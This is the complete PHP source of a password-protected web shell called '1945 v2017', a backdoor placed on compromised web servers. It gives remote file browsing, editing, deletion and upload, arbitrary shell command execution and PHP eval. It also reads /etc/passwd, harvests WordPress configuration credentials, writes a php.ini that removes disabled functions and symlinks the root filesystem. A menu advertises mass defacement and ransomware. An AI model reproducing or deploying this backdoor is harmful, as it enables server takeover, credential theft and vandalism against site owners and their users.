<?php
/**
@ 1945 v2017
@ Author 	: shutdown57 a.k.a alinko
@ Codename  : MerdekaAtaoeMati
@ Version   : 2017.0
@ Respect   : Ir. Soekarno - Muh. Hatta - Pahlawan Nasional Indonesia
@ Greets    : linuXcode.org - IndoXploit.or.id
@
*/
#@error_reporting(0);
session_start();
@set_time_limit(0);
@ini_set('file_uploads',on);
@ini_set('upload_max_filesize',1000);
@ini_set('error_log','.error-log-1945.txt'); // save error log , report if any error to : alinkokomansuby@gmail.com
$passwd_45 		= "fe4530f3758f14e06d97b05f44c9f856"; // default password : indonesianpeople
$session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'])];
$image_bg_45 	= "http://wallpapers-best.com/uploads/posts/2015-10/1_indonesia.jpg";

function passwd_45_login($wallpaper) { 
	echo "<html><head><title>".$_SERVER['HTTP_HOST']." - shutdown57 - 1945v2017</title></head><body>";
	echo "<style>body{background:url('".$wallpaper."')no-repeat center center;";
	echo "background-size:cover;background-attachment:fixed;-o-background-size:cover;-moz-background-size:cover;-webkit-background-size:cover;";
	echo "-o-background-attachment:fixed;-moz-background-attachment:fixed;-webkit-background-attachment:fixed}";
	echo "input{color:green;border:1px solid green;margin-top:250px;margin-bottom:250px;background:transparent;}";
	echo "</style>";
    echo "<form method='POST'><center><input type='password' name='pass' placeholder='Password'><input type='submit' value='>>'></center></form>";
   exit; 
} 


if(!isset($session_45)){ 
    if(empty($passwd_45)||(isset($_POST['pass'])&&(md5($_POST['pass'])==$passwd_45))){ 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 

}else{ 
        passwd_45_login($image_bg_45);
}
}

class Html45{
	public function modal($head,$konten,$id){
		echo '<div class="modal"><input id="'.$id.'" type="checkbox" /><label for="'.$id.'" class="overlay"></label><article>
		    <header><h3>'.$head.'</h3><label for="'.$id.'" class="close">&times;</label></header>
		    <section class="content">
		   '.$konten.'
		    </section>
		    <footer>
		      <label for="'.$id.'" class="button dangerous">
		        Close
		      </label>
		    </footer>
		  </article>
		</div>';
	}
	public function form($method,$content){
		echo "<form method='".$method."'>";
		echo $content;
		echo "</form>";
	}
	public function input($type,$name,$add,$label){
		$input = "<center><label for='".$name."'>".$label."</label>  : ";
		$input .= "<input type='".$type."' name='".$name."' ".$add."></center>";
		return $input;
	}
	public function submit($name,$value,$add){
		$submit = "<center><input type='submit' value='".$value."' ".$add."' name='".$name."'></center>";
		return $submit;
	}
	public function h1($text){
		echo "<center><h1>./ ".$text."</h1></center>";
	}
	public function txtarea($name,$content,$add){
		$txt = "<center>";
		$txt.= "<textarea name='".$name."' ".$add."'>";
		$txt.= $content;
		$txt.= "</textarea></center>";
		return $txt;
	}
	public function select($option,$name,$add){
		echo "<select name='".$name."' ".$add.">";
		echo $option;
		echo "</select>";
	}
	public function option($val,$show){
		$opt= "<option value='".$val."'>";
		$opt.= $show;
		$opt.= "</option>";
		return $opt;
	}
	public function footer($content){
		echo "<center>";
		echo "<div style='width:100%;height:20px;background:pink;color:#fff;margin-top:200px;font-size:12px;'>";
		echo $content;
		echo "</div></center>";
	}
}

class FileMan45{
	public $table;

	public function perms45($file)
	{
		if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
	}

	public function lmodif45($file){
	$mod=date('d M Y [H:m]',filemtime($file));
	return $mod;
	}

	public function owngro45($file){
	$name=@posix_getpwuid(@fileowner($file));
	$group=@posix_getgrgid(@filegroup($file));
	$owngro=$name['name'].":".$group['name'];
	return $owngro;
	}

	public function mime45($path)
	{
	if(@mime_content_type($path)){
		$mime=mime_content_type($path);
	}else{
		$mime="unknow/denied";
	}
	return $mime;
	}
	public function fSize45($upil){
	$size = filesize($upil)/1024;
		$size = round($size,3);
		if($size >= 1024){
		$size = round($size/1024,2).' MB';
		}else{
		$size = $size.' KB';
		}
		return $size;
		}
	public function td($isi){
		echo "<td>";
		echo $isi;
		echo "</td>";
	}
	public function th($isi){
		echo "<th>";
		echo $isi;
		echo "</th>";
	}
	public function ScanDir($dir)
	{
		echo "<table class='primary' align='center' style='width:100%;'>";
		$this->th("FILES");
		$this->th("SIZE");
		$this->th("TYPE");
		$this->th("GROUP:OWNER");
		$this->th("PERMISSION");
		$this->th("LAST MODIF");
		$this->th("ACTION");

		$s = @scandir($dir);
			echo "<tr>";
			echo "<td colspan='6'>[[ <a href='?_d=".dirname($dir)."'>..</a> ]]</td>";
			echo "<td><select><option>--New--</option>
				<option onclick=\"window.location.href='?_o=$dir&_x=nfile'\">NewFile</option>
				<option onclick=\"window.location.href='?_o=$dir&_x=ndir'\">NewDir</option></select>";
			echo "</tr>";
		foreach($s as $d)
		{

			if(!is_dir("$dir/$d")||$d=="."||$d=="..")continue;
			echo "<tr>";
			$this->td("[ <a href='?_d=$dir/$d'>$d</a> ]");
			$this->td($this->fSize45("$dir/$d"));
			$this->td($this->mime45("$dir/$d"));
			$this->td($this->owngro45("$dir/$d"));
			$this->td($this->perms45("$dir/$d"));
			$this->td($this->lmodif45("$dir/$d"));
			$this->td("<select><option></option>
				<option onclick=\"window.location.href='?_o=$dir/$d&_x=ren'\">Rename</option>
				<option onclick=\"window.location.href='?_o=$dir/$d&_x=del'\">Delete</option></select>");
			echo "</tr>";
		}

		foreach($s as $f)
		{
			if(!is_file("$dir/$f")||$f=="."||$f=="..")continue;
			echo "<tr>";
			$this->td("<a href='?_o=$dir/$f&_x=view'>$f</a>");
			$this->td($this->fSize45("$dir/$f"));
			$this->td($this->mime45("$dir/$f"));
			$this->td($this->owngro45("$dir/$f"));
			$this->td($this->perms45("$dir/$f"));
			$this->td($this->lmodif45("$dir/$f"));
			$this->td("<select><option></option>
				<option onclick=\"window.location.href='?_o=$dir/$f&_x=ren'\">Rename</option>
				<option onclick=\"window.location.href='?_o=$dir/$f&_x=del'\">Delete</option>
				<option onclick=\"window.location.href='?_o=$dir/$f&_x=edit'\">Edit</option>
				<option onclick=\"window.location.href='?_o=$dir/$f&_x=dl'\">Download</option></select>");
			echo "</tr>";
		}
		echo "</table>";
	}
}

class Action45{
	public function phpinfo45(){
	phpinfo();
	}
	public function wpc45($dir){
	if(!file_exists($dir."/wp-config.php")){
		echo "<h1> Directory Wordpress Not Exist</h1>";
	}else{
		$fp =fopen('wordpress-config.txt','w');
		fwrite($fp,htmlspecialchars(file_get_contents($dir."/wp-config.php")));
		fclose($fp);
	}
	}
	public function edit45($dir)
	{

		echo "<center>";
		echo "<form method='POST'>";
		echo "<textarea style='width:700px;height:300px;'  name='edit'>";
		echo htmlspecialchars(file_get_contents($dir));
		echo "</textarea>";
		echo "<input type='submit' value='save' name='save'  style='width:700px'>";
		echo "</form></center>";
		if(isset($_POST['save']))
		{
			$fp = fopen($dir,"w");
			if(fwrite($fp,$_POST['edit']))
			{
				echo "<script>window.location.href='?_d=".dirname($dir)."'</script>";
			}else{
				echo "<script>alert('Can Not Edit~') window.location.href='?_d=".dirname($dir)."'</script>";
			}
			fclose($fp);
		}
	}
	public function del45($dir)
	{
		if(is_file($dir)){
			$del=unlink($dir);
		}elseif (is_dir($dir)) {
			if(!rmdir($dir))
			{
				if(!rmdir(unlink($dir))){
					if(!rmdir(rmdir(unlink($dir)))){
						if(!rmdir(unlink(rmdir($dir)))){
							$del=rmdir(rmdir(rmdir(unlink($dir))));
						}
					}
				}
			}
		}
		return $del;
	}
	public function rename45($dir)
	{
		echo "<center>";
		echo "<form method='post'>";
		echo "<input type='hidden' name='oldname' value='$dir'>";
		echo "<input type='text' name='newname' value='new_name' >";
		echo "<input type='submit' name='submit' value='Save' >";
		echo "</form>";
		echo "</center>";
		if(isset($_POST['submit']))
		{
			if(rename($_POST['oldname'],$_POST['newname'])){
				echo "<script>window.location.href='?_d=".dirname($dir)."';</script>";
			}else{
				echo "<script>alert('Can Not Rename'); window.location.href='?_d=".dirname($dir)."' </script>";
			}
		}
	}
	public function dl45($dl)
	{
	@ob_clean();
	@header('Content-Description: File Transfer');
	@header('Content-Type: application/octet-stream');
	@header('Content-Disposition: attachment; filename="'.basename($dl).'"');
	@header('Expires: 0');
	@header('Cache-Control: must-revalidate');
	@header('Pragma: public');
	@header('Content-Length: ' . filesize($dl));
	@readfile($dl);
	exit;
	}
	public function view45($file)
	{
		echo "<pre>";
		echo htmlspecialchars(file_get_contents($file));
		echo "</pre>";
	}
	public function upl45($tmp,$dst)
	{

		if(function_exists('move_uploaded_file'))
		{
			$upl = @move_uploaded_file($tmp,$dst);
		}elseif(function_exists('copy'))
		{
			$upl = @copy($tmp,$dst);
		}else{
			$upl ="<script> alert('function upload disable')</script>";
		}
		return $upl;
	}
	public function Shell45($cmd){
		if(function_exists('system')){
			$sys = @system($cmd);
		}elseif(function_exists('exec')){
			$sys = @exec($cmd);
		}elseif (function_exists('shell_exec')) {
			$sys = @shell_exec($cmd);
		}elseif (function_exists('passthru')) {
			$sys = @passthru($cmd);
		}else{
			$sys = "<h1> Function not Found~<br> This Feature Disabled in Server~</h1>";
		}
		return $sys;
	}
	public function cfile45($nama,$konten){
		$fp = fopen($nama,'w');
		$co = fwrite($fp,$konten);
		fclose($fp);
		return $co;
	}
  public function cdir45($namadir){
    if(file_exists('mkdir'))
    {
      $mkdir = "<script> alert('Directory  ".$namadir." Exist~ ');</script>";
    }else{
      $mkdir = @mkdir($namafile);
    }
    return $mkdir;
  }

}


class Head45{
	public function html45($judul){
		echo "<!DOCTYPE html><html><head><title>$judul</title><link rel='stylesheet' type='text/css' href='https://cdn.jsdelivr.net/picnicss/6.3.2/picnic.min.css'><link rel='icon' type='text/css' href='http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif'></head><body>";
		echo "<style>";
		echo "tr,td{height:30px;font-size:13px;}tr:hover{background:#ff4136;}tr a{color:#000;font-weight:bold;}tr a:hover{color:#fff;border-bottom:1px solid #fff}.pseudo:hover{background:#ff4136;color:#fff}th{background:#ff4136}</style>";
	}
	public function hdd45($s) {
		if($s >= 1073741824)
		return sprintf('%1.2f',$s / 1073741824 ).' GB';
		elseif($s >= 1048576)
		return sprintf('%1.2f',$s / 1048576 ) .' MB';
		elseif($s >= 1024)
		return sprintf('%1.2f',$s / 1024 ) .' KB';
		else
		return $s .' B';
		}
	public function SysInfo45($dir){
		if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
	} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
		}
		$hdd_free = $this->hdd45(disk_free_space("/"));
		$hdd_total = $this->hdd45(disk_total_space("/"));

		$sm= ini_get('safe_mode') ? "<font color=green> ON<?font>" : "<font color=red> OFF</font>";
		echo "<div class='flex 2' style='font-size:12px;width:100%;margin-top:55px'>";
		echo "<pre>";
		echo "Kernel : ".php_uname();
		echo "\nUser   : $user ($uid) | $group ($gid)";
		echo "\nPHP    : ".phpversion()." |<b>safemode:</b>$sm (<a href='?_o=$dir&_x=phpinfo'>phpinfo</a>)";
		echo "\nDisk   : ".$hdd_total." <b> Free :</b> ".$hdd_free;
		echo "</pre>";
		echo "<h1 style='font-size:4em;float:right;font-weight:bold;'>";
		echo "		<a href='?'>1945 2017</a>";
		echo "</h1>";
		echo "</div>";
	}
	public function Tools45($dir){
	echo '<nav class="demo"><a href="?_" class="brand"><span>1945 v2017</span></a><input id="bmenub" type="checkbox" class="show"><label for="bmenub" class="burger pseudo button">menu</label>
  <div class="menu">
    <a href="'.$_SERVER['PHP_SELF'].'" class="pseudo button">Home</a>
    <a href="?_o='.$dir.'&_x=sh" class="pseudo button ">Shell</a>
    <label for="modal_1" class="pseudo button">Upload</label>
    <a href="?_o='.$dir.'&_x=php" class="pseudo button ">PHP</a>
    <label for="secinfo" class="pseudo button">Sec. Info</label>
	<label for="weapon" class="pseudo button">WeaponX1945</label>
	<a href="?_o='.$dir.'&_x=I_love_U" class="pseudo button ">LogOut</a>
  </div>
</nav>';
echo '
<div class="modal">
  <input id="modal_1" type="checkbox" />
  <label for="modal_1" class="overlay"></label>
  <article>
    <header>
      <h3>Great offer</h3>
      <label for="modal_1" class="close">&times;</label>
    </header>
    <section class="content">';
		if(is_writable($dir)){
			$dis = "";
		}else{
			$dis = "disabled";
		}
		echo'
     <form method="POST" enctype="multipart/form-data" action="?_o='.$dir.'&_x=upl">
     <input type="file" name="file" '.$dis.'><input type="submit" name="sbmt" class="button" value="Upload?" '.$dis.'></form>
    </section>
    <footer>
      <label for="modal_1" class="button dangerous">
        Cancel
      </label>
    </footer>
  </article>
</div>
';

	}
	public function SecInfo45(){
		function red($t){
			return "<font color=red>".$t."</font>";
		}
		function green($t){
			return "<font color=green>".$t."</font>";
		}
		if(is_readable("/etc/passwd")){
			$etcpw = "/etc/passwd : <font color=green> READABLE </font> [<a href='javascript:;' onclick=\"document.getElementById('ep').style.display='block';\">Show</a>]";
			$etcpw .= "<div id='ep' style='display:none;'><pre style='width:500px;height:250px;'>";
			$etcpw .= file_get_contents("/etc/passwd");
			$etcpw .="</pre></div>";
		}else{
			$etcpw = "/etc/passwd : <font color=red> NOT READABLE</font>";
		}
		if(ini_get('disable_functions')){
			$str = ini_get('disable_functions');
			$df = "disable functions : ".wordwrap($str,40,"<br>",TRUE);
		}else{
			$df = "disable functions : <font color=green> NONE </font> (Not Secure)";
		}
		if(is_writable(php_ini_loaded_file()))
		{
			$ini = green("WRITEABLE")." | <a href='?_o=".__DIR__."&_x=phpini'>Edit php.ini</a>";
		}else {
			$ini = red("NOT WRITABLE");
		}
		$curl = (curl_init()) ? green("YOSHA") : red("NONE");
		$mysql = (function_exists('mysql_connect')) ? green("YOSHA") : red("NONE");
		$mysqli = (function_exists('mysqli_connect')) ? green("YOSHA") : red("NONE");
		if(function_exists('apache_get_modules')){
			$apache_load_module ="<b> Apache Loaded Module : ". wordwrap(implode(",",apache_get_modules()),40,"<br>",TRUE)."</b>";
		}else{
			$apache_load_module = "";
		}
		$html = new Html45();
		
		$head = "Security Info : ".$_SERVER['HTTP_HOST']." < ".gethostbyname($_SERVER['HTTP_HOST'])." > ";
		$konten = "<b> Server Software :". $_SERVER['SERVER_SOFTWARE'] . "</b><hr>";
		$konten.= $apache_load_module."<hr>";
		$konten.= "<b> IP Client : </b> ".$_SERVER['REMOTE_ADDR']."<hr>";
		$konten.= "<b> MySQL :".$mysql." | CURL : ".$curl." | MySQLI : ".$mysqli." | </b><hr>";
		$konten.= "<b> passwd file </b><br>".$etcpw;
		$konten.= "<hr><b>Disable Functions </b><br>";
		$konten.= $df;
		$konten.= "<hr><b> php.ini</b><br>";
		$konten.= $ini;
		$id = "secinfo";
		$html->modal($head,$konten,$id);
	}
}
if(isset($_GET['_d']))
{
	$d = $_GET['_d'];
}else{
	$d = __DIR__;
}
$html = new Html45();

// List Tools
function abtn($href,$val){
	$o= "   <a href='".$href."' class='button'>".$val."</a>   ";
	return $o;
}
$weapon = abtn("?_o=$d&_x=lsym","linuXSymLink");
$weapon.= abtn("?_o=$d&_x=sym","Symlink");
$weapon.= abtn("?_o=$d&_x=jump","Jumping");
$weapon.= abtn("?_o=$d&_x=wpc","WP Config");
$weapon.= abtn("?_o=$d&_x=md","Mass Deface");
$weapon.= abtn("?_o=$d&_x=rw","RansomeWare");
$weapon.= abtn("?_o=$d&_x=fr","Fake Root");
$weapon.= abtn("?_o=$d&_x=zh","Zone-H");
$weapon.= abtn("?_o=$d&_x=af","Admin Finder Wordlist");
$weapon.= abtn("?_o=$d&_x=di","Defacer ID");
$weapon.= abtn("?_o=$d&_x=am","Adminer");
$weapon.= abtn("?_o=$d&_x=net","Network");

$html->modal("WeaponX1945",$weapon,"weapon");
// End List

$Head = new Head45();
$Head->html45("1945-X-".$_SERVER['HTTP_HOST']);

$Head->SysInfo45($d);
$Head->Tools45($d);
// FileManager

$FileMan = new FileMan45();
$Head->SecInfo45();
if(!isset($_GET['_o'])){

$FileMan->ScanDir($d);

}else{
// Logika AKsi ifelse
if(isset($_GET['_x'])){
$act = new Action45();

$x = $_GET['_x'];
if($x == "edit"){
$html->h1("Edit File : <small>".$_GET['_o']."</small>");
$act->edit45($_GET['_o']);

}elseif($x == "del"){
if($act->del45($_GET['_o'])){
	echo "<script>window.location.href='?_d=".dirname($_GET['_o'])."';</script>";
}else{
	echo "<script>window.location.href='?_d=".dirname($_GET['_o'])."';</script>";
}

}elseif($x == "ren"){
	$html->h1("Rename : <small>".$_GET['_o']."</small>");
	$act->rename45($_GET['_o']);
}elseif ($x == "dl") {
	@$act->dl45($_GET['_o']);
}elseif ($x == "view") {
	$html->h1("VIew Content : <small>".$_GET['_o']."</small>");
	$act->view45($_GET['_o']);
}elseif ($x == "upl") {
	if($act->upl45($_FILES['file']['tmp_name'],$_GET['_o']."/".$_FILES['file']['name'])){
		echo "<script>alert('Upload OK!'); window.location.href='?_d=".$_GET['_o']."'</script>";
	}else{
		echo "<script>alert('Upload FAIL!'); window.location.href='".$_GET['_o']."'</script>";
	}
}elseif ($x == "sh") {
	$html->h1("Shell Command : ".$_SERVER['HTTP_HOST']);
	$html->form("POST",$html->input("text","sh","style='width:80%;'",$_SERVER['HTTP_HOST']));
	if(isset($_POST['sh'])){
		echo "<pre>";
		$act->Shell45($_POST['sh']);
		echo "</pre>";
	}
}elseif ($x == "php") {

	$html->h1("PHP Eval ");
	$content = $html->txtarea("eval","phpinfo();","style='width:700px;height:300px;'");
	$content .=$html->submit("evals","Execute php","");
	$html->form("POST",$content);
	if(isset($_POST['evals']))
	{
		eval($_POST['eval']);
	}


}elseif ($x == "phpinfo") {
	$act->phpinfo45();
}elseif ($x == "nfile") {
	$html->h1("New File : <small>".$_GET['_o']."</small>");
	$html->form("POST",$html->txtarea("newfile","// new-file 1945","style='width:700px;height:300px;'").$html->input("text","nama","value='namafile.php' style='width:500px;'","newfile name").$html->submit("simpan","Save New File",""));
	if(isset($_POST['simpan']))
	{
		if($act->cfile45($_GET['_o']."/".$_POST['nama'],$_POST['newfile'])){
			echo "<script>alert('Make File Done !'); window.location.href='?_d=".$_GET['_o']."'</script>";
		}else{
			echo "<script> alert('Permission denied.. can not create file ')</script>";
		}
	}
}elseif ($x == "ndir") {
  $html->h1("New Directory : <small>".$_GET['_o']."</small>");
  $html->form("POST",$html->input("text","dir","value='new-dir-45'","New Directory").$html->submit("simpan","Save New Directory",""));
  if(isset($_POST['simpan']))
  {
    if($act->cdir45($_GET['_o']."/".$_POST['dir']))
    {
      echo "<script>alert('Created Directory~'); window.location.href='?_d=".dirname($_GET['_o'])."'</script>";
    }else{
      echo "<script>alert('Permission Denied Can not Create Directory');</script>";
    }
  }
}elseif ($x == "phpini") {
	$html->h1("Create php.ini configuration : <small>".$_GET['_o']."/php.ini</small>");
	$select = $html->option("disable_functions=NONE","disable functions").$html->option("safe_mode=NONE","safe mode");
	$content = $html->txtarea("phpini","disable_functions=NONE","style='width:700px;height:400px;'").
						$html->select($select,"sphpini","").
						$html->submit("submits","Create Config","");
	$html->form("POST",$content);
	if(isset($_POST['submits'])){
		if($act->cfile45("php.ini",$_POST['phpini']."\n".$_POST['sphpini']))
		{
			echo "<script>alert('php.ini Created~'); window.location.href='?'</script>";
		}else{
			echo "<script>alert('Permission Denied~')</script>";
		}
	}
}elseif($x == "lsym"){
		$html->h1("linuX Symlink :p");
		$letak = "Sym45";
		$open = "http://".$_SERVER['HTTP_HOST'].$letak;
		$act->Shell45("ln -s / Sym45");
		echo "linuX Symlink Execute ln -s / Sym45 -> DONE ? <br> <a href='$open' target='_blank'>Click Here</a>";
}elseif($x == "wpc"){
		$html->h1("wordpress-config");
		$val = __DIR__;
		$input = $html->input("text","ldir","style='width:300px;' value='".$val."'","Wordpress dir ");
		$submit = $html->submit("submitz","Get Config~","");
		$html->form("POST",$input.$submit);
		if(isset($_POST['submitz'])){
			if($act->wpc45($_POST['ldir'],"<h1>FAILED AJG</h1>")){
				echo "<script> alert('Yosha !');  window.location.href='?_o=$d/wordpress-config.txt&_x=view'</script>";
			}
		}
}elseif ($x == "I_love_U") {
	session_destroy();
	echo "<script> alert('Bye Bye Bye !'); window.location.href='".$_SERVER['PHP_SELF']."'; </script>";
}
}

}
// footer
$foot = "copyright &copy; ".date('Y')." <a href='http://www.linuXcode.org' target='_blank'>linuXcode.org</a> - alinko ";
$html->footer($foot);
